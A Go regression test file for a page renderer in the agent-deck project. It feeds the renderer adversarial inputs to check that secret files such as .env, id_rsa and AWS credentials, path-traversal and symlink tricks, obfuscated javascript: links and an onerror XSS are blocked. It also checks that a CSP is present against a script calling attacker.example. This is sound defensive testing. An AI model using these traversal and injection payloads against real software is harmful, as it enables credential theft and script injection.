package openpages

// The independent review's adversarial cases (review-openpage, 18 Nov 2026), kept as regression tests.

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/asheshgoplani/agent-deck/internal/filelinks"
)

func rvProject(t *testing.T) (string, string) {
	t.Helper()
	tmp := t.TempDir()
	root := filepath.Join(tmp, "proj")
	for name, body := range map[string]string{
		".env": "KEY=RV-SECRET-ENV", ".git/config": "RV-SECRET-GIT", ".aws/credentials": "RV-SECRET-AWS",
		"id_rsa": "RV-SECRET-IDRSA", "server.pem": "RV-SECRET-PEM", "tls.key": "RV-SECRET-KEY",
		"sub/.env.local": "RV-SECRET-SUBENV", "ok.css": "h1{color:red}",
	} {
		writeFile(t, filepath.Join(root, name), body)
	}
	writeFile(t, filepath.Join(tmp, "outside.txt"), "RV-SECRET-OUTSIDE")
	return tmp, root
}

func rvRender(t *testing.T, root, name, body string) string {
	t.Helper()
	p := filepath.Join(root, name)
	writeFile(t, p, body)
	r, err := Render([]string{root}, Page{Path: p, Kind: KindOf(p)})
	if err != nil {
		t.Fatalf("render %s: %v", name, err)
	}
	return string(r.HTML)
}

// 1. A dotfile or key file opened directly must not be rendered for the phone.
func TestReviewSecretFilesAreNotPages(t *testing.T) {
	_, root := rvProject(t)
	for _, name := range []string{".env", ".git/config", ".aws/credentials", "id_rsa", "server.pem", "tls.key", "sub/.env.local"} {
		p := filepath.Join(root, name)
		r, err := Render([]string{root}, Page{Path: p, Kind: KindOf(p)})
		if err == nil && strings.Contains(string(r.HTML), "RV-SECRET") {
			t.Errorf("%s was rendered for the phone with its content", name)
		}
	}
}

// 2. A page must not pull secrets in as assets (any tag, CSS, srcset).
func TestReviewSecretFilesAreNotInlinedAsAssets(t *testing.T) {
	_, root := rvProject(t)
	doc := rvRender(t, root, "p.html", `<html><head><link rel="stylesheet" href=".env"><style>@import ".aws/credentials"; a{background:url(id_rsa)}</style></head>
<body><img src=".git/config"><img src="%2eenv"><img src="sub/../.env"><script src="tls.key"></script><img srcset="server.pem 1x, sub/.env.local 2x"><object data=".env"></object></body></html>`)
	if n := strings.Count(doc, "base64,"); n > 0 || strings.Contains(doc, "RV-SECRET") {
		t.Errorf("secrets inlined: %d data URIs, clear text=%v", n, strings.Contains(doc, "RV-SECRET"))
	}
}

// 3. Markdown images must not inline secrets either.
func TestReviewMarkdownImageDoesNotInlineSecrets(t *testing.T) {
	_, root := rvProject(t)
	doc := rvRender(t, root, "n.md", "# t\n![a](.env) ![b](.git/config) ![c](id_rsa)\n")
	if strings.Contains(doc, "base64,") {
		t.Errorf("markdown image inlined a secret file")
	}
}

// 4. A symlink inside the project that points at an in-project dotfile.
func TestReviewSymlinkToDotfileIsNotInlined(t *testing.T) {
	_, root := rvProject(t)
	if err := os.Symlink(".env", filepath.Join(root, "logo.png")); err != nil {
		t.Fatal(err)
	}
	doc := rvRender(t, root, "s.html", `<img src="logo.png">`)
	if strings.Contains(doc, "base64,") {
		t.Errorf("symlink logo.png -> .env was inlined")
	}
}

// 5. Outside the roots: encoded traversal, backslash, absolute, symlinked dir; and a swap after the open.
func TestReviewOutsideStaysOutside(t *testing.T) {
	tmp, root := rvProject(t)
	if err := os.Symlink(tmp, filepath.Join(root, "up")); err != nil {
		t.Fatal(err)
	}
	doc := rvRender(t, root, "o.html", `<img src="../outside.txt"><img src="%2e%2e/outside.txt"><img src="..%2foutside.txt"><img src="up/outside.txt">
<img src="`+filepath.Join(tmp, "outside.txt")+`"><img src="file://`+filepath.Join(tmp, "outside.txt")+`"><link rel=stylesheet href="../outside.txt"><style>@import "../outside.txt";</style>`)
	if strings.Contains(doc, "base64,") || strings.Contains(doc, "RV-SECRET-OUTSIDE") {
		t.Fatalf("outside file reached the document")
	}
	page := filepath.Join(root, "swap.html")
	writeFile(t, page, "<p>ok</p>")
	if err := os.Remove(page); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(tmp, "outside.txt"), page); err != nil {
		t.Fatal(err)
	}
	if _, err := Render([]string{root}, Page{Path: page, Kind: KindHTML}); !errors.Is(err, filelinks.ErrOutside) {
		t.Fatalf("swapped symlink: err=%v, want ErrOutside", err)
	}
}

// 6. Markdown link schemes, obfuscated.
func TestReviewMarkdownSchemes(t *testing.T) {
	_, root := rvProject(t)
	doc := rvRender(t, root, "m.md", "[a](JaVaScRiPt:alert(1)) [b](java&#x73;cript:alert(1)) [c](intent://x#Intent;end) [d](data:text/html,x) [e](file:///etc/passwd) [f](vbscript:x) [g]( javascript:alert(1)) [h](&#106;avascript:alert(1)) [i](javascript&colon;alert(1))\n\n<img src=x onerror=alert(1)>\n")
	low := strings.ToLower(doc)
	for _, bad := range []string{`href="javascript`, `href="intent`, `href="data:`, `href="file:`, `href="vbscript`, `href=" javascript`, "<img src=x", `href="&#106;`, `href="javascript&amp;colon`, `href="javascript&colon`} {
		if strings.Contains(low, bad) {
			t.Errorf("markdown output contains %q", bad)
		}
	}
}

// 7. The rendered document should itself carry a CSP (the phone gets it as a string, no HTTP header).
func TestReviewDocumentCarriesItsOwnCSP(t *testing.T) {
	_, root := rvProject(t)
	for _, name := range []string{"c.html", "c.md"} {
		doc := rvRender(t, root, name, "# hi\n<script>fetch('https://attacker.example/')</script>\n")
		if !strings.Contains(strings.ToLower(doc), "content-security-policy") {
			t.Errorf("%s: no CSP meta in the self-contained document", name)
		}
	}
}

// 8. Size limits.
func TestReviewSizeLimits(t *testing.T) {
	_, root := rvProject(t)
	big := filepath.Join(root, "big.html")
	writeFile(t, big, strings.Repeat("a", int(MaxSourceBytes)+1))
	if _, err := Render([]string{root}, Page{Path: big, Kind: KindHTML}); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("big page: %v", err)
	}
	writeFile(t, filepath.Join(root, "a.bin"), strings.Repeat("b", 5<<20))
	doc := rvRender(t, root, "many.html", `<img src="a.bin"><img src="a.bin?2"><img src="a.bin?3"><img src="a.bin?4">`)
	if int64(len(doc)) > MaxDocumentBytes {
		t.Fatalf("document %d bytes over the limit", len(doc))
	}
}
